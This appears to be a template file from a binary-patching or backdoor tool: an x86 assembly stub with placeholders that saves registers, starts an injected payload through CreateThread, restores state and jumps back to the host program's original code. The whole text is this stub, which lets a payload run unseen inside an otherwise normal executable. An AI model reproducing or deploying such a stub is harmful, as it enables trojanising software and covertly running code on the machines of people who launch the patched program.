use32
pushad 
pushfd 
push 0 
push 0 
push 0 
push {{ offset_payload }}
push 0 
push 0 
call dword [{{ imports["CreateThread"] }}] 
popfd 
popad 
    push {{ go }}
    ret